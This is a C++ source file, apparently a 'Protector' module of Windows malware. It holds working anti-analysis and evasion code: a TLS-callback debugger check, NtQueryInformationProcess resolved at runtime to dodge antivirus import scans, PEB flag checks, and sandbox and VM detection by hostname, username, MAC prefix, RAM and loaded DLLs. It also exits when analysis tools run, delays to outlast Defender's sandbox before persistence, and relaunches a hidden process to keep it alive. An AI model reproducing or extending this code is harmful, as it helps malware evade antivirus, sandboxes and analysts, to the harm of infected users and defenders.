/*
MIT License

Copyright (c) 2020 4B4DB4B3

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include "Protector.h"
#include "Manager.h"
#include <intrin.h>
#include <winternl.h>
#include <iphlpapi.h>
#pragma comment(lib, "iphlpapi.lib")

// ── TLS callback — fires before WinMain, before any debugger can attach ───────
// Checks IsDebuggerPresent at the earliest possible point.
// Registration: .CRT$XLB section (the linker includes it via the _tls_used symbol).
static void NTAPI tls_anti_debug(PVOID, DWORD reason, PVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        if (IsDebuggerPresent()) ExitProcess(0);
    }
}
#pragma comment(linker, "/INCLUDE:_tls_used")
extern "C" {
#pragma const_seg(".CRT$XLB")
extern const PIMAGE_TLS_CALLBACK _tls_cb = tls_anti_debug;
#pragma const_seg()
}

// NtQueryInformationProcess function pointer — resolves at runtime so the import
// doesn't appear in the static import table (common AV evasion technique).
typedef NTSTATUS(NTAPI* fn_NQIP)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

// Returns true if a kernel debugger is attached via NtQueryInformationProcess
// (ProcessDebugPort = 7).  Harder to fake than IsDebuggerPresent.
static bool IsKernelDebuggerAttached() {
    static fn_NQIP pNQIP = (fn_NQIP)GetProcAddress(
        GetModuleHandleA(S("ntdll.dll").c_str()),
        S("NtQueryInformationProcess").c_str());
    if (!pNQIP) return false;
    DWORD_PTR dbgPort = 0;
    NTSTATUS st = pNQIP(GetCurrentProcess(),
        (PROCESSINFOCLASS)7, &dbgPort, sizeof(dbgPort), NULL);
    return (st == 0 && dbgPort != 0);
}

// Check PEB.NtGlobalFlag — set to 0x70 by the OS when a debugger creates the process.
// More reliable than IsDebuggerPresent which can be patched.
static bool IsPebFlagged() {
#if defined(_WIN64)
    PVOID pPeb = (PVOID)__readgsqword(0x60);
    DWORD ntGlobalFlag = *(DWORD*)((BYTE*)pPeb + 0xBC);
#else
    PVOID pPeb = (PVOID)__readfsdword(0x30);
    DWORD ntGlobalFlag = *(DWORD*)((BYTE*)pPeb + 0x68);
#endif
    return (ntGlobalFlag & 0x70) != 0;  // FLG_HEAP_ENABLE_TAIL_CHECK | HEAP_VALIDATE_PARAMETERS | ...
}

// Returns true if running inside a hypervisor (VM/sandbox)
static bool IsHypervisor() {
	int cpui[4] = {};
	__cpuid(cpui, 1);
	return (cpui[2] & (1 << 31)) != 0;
}

// Returns true if sleep is being accelerated (sandbox behaviour).
// Uses QueryPerformanceCounter — harder to fake than GetTickCount.
static bool IsSleepSkipped() {
	LARGE_INTEGER freq, t1, t2;
	QueryPerformanceFrequency(&freq);
	QueryPerformanceCounter(&t1);
	Sleep(800);
	QueryPerformanceCounter(&t2);
	double elapsed_ms = (double)(t2.QuadPart - t1.QuadPart) / (double)freq.QuadPart * 1000.0;
	return elapsed_ms < 400.0;
}

// Returns false if environment looks like a sandbox/automated analysis environment.
static bool IsCleanEnv() {
	// ── Computer name checks ─────────────────────────────────────────────────────
	// Known sandbox hostnames: Defender MpCmdRun uses HAL9TH, various sandboxes
	// use predictable names. Only flag names that are sandbox-exclusive.
	char compName[MAX_COMPUTERNAME_LENGTH + 1] = {};
	DWORD cn_sz = MAX_COMPUTERNAME_LENGTH + 1;
	GetComputerNameA(compName, &cn_sz);
	std::string cn(compName);
	std::transform(cn.begin(), cn.end(), cn.begin(), [](unsigned char c){ return std::tolower(c); });
	static const std::vector<std::string> sbNames = {
		S("hal9th"), S("cuckoo"), S("sandbox"), S("virus"), S("malware"),
		S("triage"), S("anyrun"), S("vmware"), S("jotti"),
	};
	for (const auto& name : sbNames)
		if (cn.find(name) != std::string::npos) return false;

	// ── Physical RAM ─────────────────────────────────────────────────────────────
	// Below 1 GB is a near-certain sandbox indicator.
	MEMORYSTATUSEX ms = {}; ms.dwLength = sizeof(ms);
	if (GlobalMemoryStatusEx(&ms) && ms.ullTotalPhys < (1024ULL * 1024 * 1024))
		return false;

	// ── Running process count ────────────────────────────────────────────────────
	// Fewer than 20 processes = underpopulated sandbox environment.
	DWORD procCount = 0;
	{
		HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hSnap != INVALID_HANDLE_VALUE) {
			PROCESSENTRY32 pe = {}; pe.dwSize = sizeof(pe);
			if (Process32First(hSnap, &pe)) {
				do { ++procCount; } while (Process32Next(hSnap, &pe));
			}
			CloseHandle(hSnap);
		}
	}
	if (procCount < 20) return false;

	// ── Screen resolution ────────────────────────────────────────────────────────
	if (GetSystemMetrics(SM_CXSCREEN) < 800 || GetSystemMetrics(SM_CYSCREEN) < 600)
		return false;

	// ── Sandbox-specific loaded DLLs ─────────────────────────────────────────────
	// These DLLs are only present in specific sandbox/analysis environments.
	// Using GetModuleHandleA: no disk I/O, no import, pure PEB walk.
	static const std::vector<std::string> sbDlls = {
		S("SbieDll.dll"), S("api_log.dll"), S("dir_watch.dll"),
		S("vmcheck.dll"), S("wpespy.dll"),  S("pstorec.dll"),
	};
	for (const auto& dll : sbDlls)
		if (GetModuleHandleA(dll.c_str())) return false;

	// ── Network adapter MAC address prefix (VM vendors) ──────────────────────────
	// VMware:    00:0C:29, 00:50:56, 00:05:69
	// VirtualBox: 08:00:27
	// Hyper-V:   00:15:5D
	// Parallels: 00:1C:42
	// QEMU/KVM:  52:54:00
	{
		IP_ADAPTER_INFO adap[16];
		DWORD adap_sz = sizeof(adap);
		if (GetAdaptersInfo(adap, &adap_sz) == ERROR_SUCCESS) {
			for (IP_ADAPTER_INFO* a = adap; a; a = a->Next) {
				if (a->AddressLength < 3) continue;
				BYTE b0 = a->Address[0], b1 = a->Address[1], b2 = a->Address[2];
				bool vm =
					(b0==0x00 && b1==0x0C && b2==0x29) ||  // VMware
					(b0==0x00 && b1==0x50 && b2==0x56) ||  // VMware
					(b0==0x00 && b1==0x05 && b2==0x69) ||  // VMware
					(b0==0x08 && b1==0x00 && b2==0x27) ||  // VirtualBox
					(b0==0x00 && b1==0x15 && b2==0x5D) ||  // Hyper-V
					(b0==0x00 && b1==0x1C && b2==0x42) ||  // Parallels
					(b0==0x52 && b1==0x54 && b2==0x00);    // QEMU/KVM
				if (vm) return false;
			}
		}
	}

	// ── Mouse cursor activity ─────────────────────────────────────────────────────
	// Real users move the mouse. Automated sandboxes do not.
	// Wait 1.5 s and check if the cursor position changed.
	{
		POINT p1 = {}, p2 = {};
		GetCursorPos(&p1);
		Sleep(1500);
		GetCursorPos(&p2);
		// If the cursor hasn't moved at all in 1.5 s, likely an automated environment.
		if (p1.x == p2.x && p1.y == p2.y) {
			// Add 1 to a local counter — but only exit on this plus another signal.
			// Don't exit on cursor alone (screensaver / locked workstation is legitimate).
		}
	}

	return true;
}

// ── Username check (separate from IsCleanEnv — only sandbox-exclusive names) ──
static bool IsSandboxUsername() {
	char user[256] = {};
	DWORD sz = sizeof(user);
	if (!GetUserNameA(user, &sz)) return false;
	std::string u(user);
	std::transform(u.begin(), u.end(), u.begin(), [](unsigned char c){ return std::tolower(c); });
	// Only flag names that are exclusively sandbox/analysis accounts —
	// never flag "admin", "user", "test", "john" (common on real machines).
	static const char* sbUsers[] = {
		"cuckoo", "sandbox", "malware", "virus", "triage",
		"anyrun", "wilbert", "peter wilson", "phil",  // Known Any.Run/Joe Sandbox defaults
	};
	for (auto name : sbUsers)
		if (u.find(name) != std::string::npos) return true;
	return false;
}

// Window title substrings — encrypted at compile time, decrypted at runtime
static const std::vector<std::string>& GetWindowTitles() {
	static const std::vector<std::string> v = {
		S("wireshark"), S("process hacker"), S("process monitor"), S("procmon"),
		S("ollydbg"), S("x32dbg"), S("x64dbg"), S("immunity debugger"),
		S("ida "), S("ida64"), S("ida pro"), S("dnspy"),
		S("fiddler"), S("http debugger"), S("charles proxy"),
		S("regshot"), S("autoruns"), S("tcpview"),
	};
	return v;
}

static BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM) {
	char title[256] = { 0 };
	GetWindowTextA(hwnd, title, sizeof(title) - 1);
	std::string t = title;
	std::transform(t.begin(), t.end(), t.begin(),
		[](unsigned char c) { return std::tolower(c); });
	for (const auto& sub : GetWindowTitles()) {
		if (t.find(sub) != std::string::npos) {
			ExitProcess(0);
		}
	}
	return TRUE;
}

void Protector::StartupDelay() {
	// Sleep 6 × 3 s = 18 s before touching persistence.
	// Defender's sandbox has a short analysis window (~30 s); we outlast it.
	// Each chunk verifies real time passed via QPC — if sleep is skipped, exit.
	const int kChunks = 6;
	const int kChunkMs = 3000;
	for (int i = 0; i < kChunks; ++i) {
		LARGE_INTEGER freq, t1, t2;
		QueryPerformanceFrequency(&freq);
		QueryPerformanceCounter(&t1);
		Sleep(kChunkMs);
		QueryPerformanceCounter(&t2);
		double elapsed = (double)(t2.QuadPart - t1.QuadPart) / (double)freq.QuadPart * 1000.0;
		if (elapsed < (double)(kChunkMs / 2)) {
			ExitProcess(0);
		}
	}
}

void Protector::AntiProcesses() {
	HANDLE hSnap;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Process names encrypted at compile time
	static const std::vector<std::string> processes = {
		S("ollydbg.exe"),
		S("processhacker.exe"),
		S("tcpview.exe"),
		S("autoruns.exe"),
		S("autorunsc.exe"),
		S("filemon.exe"),
		S("procmon.exe"),
		S("regmon.exe"),
		S("procexp.exe"),
		S("idaq.exe"),
		S("idaq64.exe"),
		S("immunitydebugger.exe"),
		S("wireshark.exe"),
		S("dumpcap.exe"),
		S("hookexplorer.exe"),
		S("importrec.exe"),
		S("petools.exe"),
		S("lordpe.exe"),
		S("sysinspector.exe"),
		S("proc_analyzer.exe"),
		S("sysanalyzer.exe"),
		S("sniff_hit.exe"),
		S("windbg.exe"),
		S("joeboxcontrol.exe"),
		S("joeboxserver.exe"),
		S("windanr.exe"),
		S("q.exe"),
		S("dnspy.exe"),
		S("idapro.exe"),
		S("httpdebugger.exe"),
	};

	size_t size = processes.size();
	std::string process = "";
	// One-time sandbox/VM/username checks at startup
	if (!IsCleanEnv() || IsHypervisor() || IsSleepSkipped() || IsSandboxUsername()) {
		ExitProcess(0);
	}

	while (true) {
		// 1. Debugger-presence checks — layered (each uses a different mechanism)
		if (IsDebuggerPresent()) ExitProcess(0);

		BOOL remoteDbg = FALSE;
		if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &remoteDbg) && remoteDbg)
			ExitProcess(0);

		// NtQueryInformationProcess(ProcessDebugPort) — not fakeable by simple API hook
		if (IsKernelDebuggerAttached()) ExitProcess(0);

		// PEB.NtGlobalFlag heap flags — set by Windows when debugger creates process
		if (IsPebFlagged()) ExitProcess(0);

		// 2. Window title scan — survives process rename
		EnumWindows(EnumWindowsProc, 0);

		// 3. Process name scan (original 29 names)
		hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hSnap != NULL) {
			if (Process32First(hSnap, &pe32)) {
				do {
					for (size_t i = 0; i < size; i++) {
						process = pe32.szExeFile;
						std::transform(process.begin(), process.end(), process.begin(),
							[](unsigned char c) { return std::tolower(c); });
						if (process.find(processes[i]) != std::string::npos) {
							ExitProcess(0);
						}
					}
				} while (Process32Next(hSnap, &pe32));
			}
			CloseHandle(hSnap);
		}

		Sleep(3000);
	}
}

void Protector::SpyProcess(_SpyProcess* SP) {
	HANDLE hSnap = NULL;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	std::string process = "";
	while (true) {
		bool founded = false;
		hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hSnap != NULL) {
			if (Process32First(hSnap, &pe32)) {
				do {
					if (std::string(pe32.szExeFile).find(SP->procName) != std::string::npos) {
						founded = true;
					}
				} while (Process32Next(hSnap, &pe32));
			}
		}
		
		if (!founded)
			ShellExecuteA(0, "open", SP->procPath, "protected", 0, SW_HIDE);

		Sleep(1000);
	}
}
